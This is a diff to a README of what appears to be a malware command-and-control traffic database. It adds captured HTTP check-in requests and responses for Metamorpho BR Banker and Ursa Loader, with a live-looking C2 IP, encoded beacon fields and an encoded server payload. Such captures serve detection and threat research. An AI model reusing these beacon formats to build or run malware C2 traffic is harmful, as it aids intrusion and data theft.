@@ -575,6 +575,37 @@ Connection: close
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lokibot.png "Lokibot")
 
+#### Metamorpho BR Banker
+~~~
+POST / HTTP/1.0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 249
+Host: 18.217.112.176
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: identity
+User-Agent: Mozilla/3.0 (compatible; Indy Library)
+
+spxndja=HERETEVFDEVFJERERFEERFFEXERFJFGFKER&kfcemfgj=CCO&gvtsavp=EFMFM&ixjpblda=HEDEEDOEGDODXCPDKDMDMDYEFDXEEDSCMEHFAFFCCDACMCTCSCMDCCXCQCSDUDLCMCMDOFFEXFDFAFKEYCCCKEFFFFAFLEVEUCCEDFLERFLEVFKCLCMCMEHFAFFEUFGFOFKCCDNEVEWEVFFEUEVFJCMCYCWDLCM&xhwen=YDL
+
+HTTP/1.1 200 OK
+Date: Fri, 19 Jul 2019 15:18:12 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Fri, 19 Jul 2019 15:18:12 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorpho.png "Metamorpho")
+
 #### MilkyBoy
 ~~~
 POST / HTTP/1.1
@@ -1158,6 +1189,33 @@ GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08
 GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/path/C:%5CUsers%5CJonathan%5CAppData%5CRoaming%5CnetRest%5C%E4%BB%BB%E3%81%AF%E3%82%A7%E7%A7%81%E3%81%8D%E7%A7%81%E6%8A%B1%E3%81%9F%E3%82%82%E3%81%A1%E6%84%9B.exe/0/
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/trickbot.png "Trickbot")
+
+#### Ursa Loader
+~~~
+POST /nj41.php HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
+Host: 18.217.112.176
+Content-Length: 3
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+q=1HTTP/1.1 200 OK
+Date: Fri, 19 Jul 2019 15:17:26 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 5840
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+FHTHSEPHJHWHWHTHWEPHWHJHXIAHRHJEPHSHJIDHYDVDSDVDSDVDSDVDSHHHTHSHXHYEPEPHHGAGMGBEPEPEPFTEPFNFODVDSHHHTHSHXHYEPEPHHGGGBEPEPFTEPERFHERDVDSHHHTHSHXHYEPEPHXGPHTHQHJGVEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFHPHXFJHFERDVDSHHHTHSHXHYEPEPHXGPHTHQHJGVGUFIEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFHRFFHPHXFJERDVDSHHHTHSHXHYEPEPICHQHNHSHPGDEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFERDVDSHHHTHSHXHYEPEPHHGPHFHNIFFHEPFTEPERGAFQHAGSHXHJHWHXHAGNIAHGHQHNHHHAERDVDSHHHTHSHXHYEPEPHHGVGFEPFTEPERFEHSHOFKERDVDSHHHTHSHXHYEPEPHHGVGXEPFTEPERFEIFHNHUERDVDSHHHTHSHXHYEPEPHHGUIAHXFJHWEPFTEPERHPHXFJERDVDSHHHTHSHXHYEPEPHHGQHJHSGJHTHFHIEPFTEPERHUHYHTHRIDERDVDSHHHTHSHXHYEPEPHHGAHMHNHQHJHGHJHFHSHXEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSFXHUHUEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSFX
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursa.png "Ursa Loader")
 
 #### Ursnif:
 ~~~
